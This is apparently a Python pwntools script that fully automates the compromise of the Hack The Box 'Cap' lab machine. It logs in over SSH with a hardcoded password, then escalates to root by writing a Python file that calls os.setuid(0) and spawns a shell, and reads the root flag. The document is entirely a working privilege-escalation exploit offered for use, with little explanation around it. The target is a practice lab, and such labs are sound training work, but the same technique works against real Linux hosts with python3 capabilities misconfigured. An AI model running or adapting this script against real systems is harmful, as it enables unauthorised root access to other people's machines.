# Coded by vanishyi
# HTB Cap autopwn
from pwn import *

ip = input("put in the target ip address:").replace('\n','')

s = ssh(host=ip, user="nathan", password="Buck3tH4TF0RM3!")
pfile = 'import os\nos.setuid(0)\nos.system("/bin/bash")'
s["echo '"+pfile+"' > pfile.py"]
s['echo "cat /root/root.txt > f2.txt" | python3 pfile.py']

f1 = "user flag: " + repr(s['cat user.txt'])
f2 = "root flag: " + repr(s['cat f2.txt'])

print(f1)
print(f2)
